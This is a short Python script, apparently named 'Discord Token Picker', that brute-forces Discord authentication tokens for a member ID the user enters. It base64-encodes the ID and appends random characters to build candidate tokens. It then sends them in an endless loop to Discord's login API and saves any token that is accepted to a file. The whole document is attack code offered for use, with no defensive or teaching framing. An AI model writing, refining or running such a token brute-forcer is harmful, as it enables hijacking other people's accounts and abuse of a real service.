import pybase64
import os
import random
import string
import requests
from colorama import *

os.system("title Discord Token Picker By Naume")

ide = pybase64.b64encode((input("Id of the member:")).encode("ascii"))
ide = str(ide)[2:-1]

while ide == ide:
    token = ide + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    headers={
        'Authorization': token
    }
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] VALID' + ' ' + token)
            f = open('hit.txt', "a+")
            f.write(f'{token}\n')
        else:
            print(Fore.RED + '[-] INVALID' + ' ' + token)
    finally:
        print("")


input()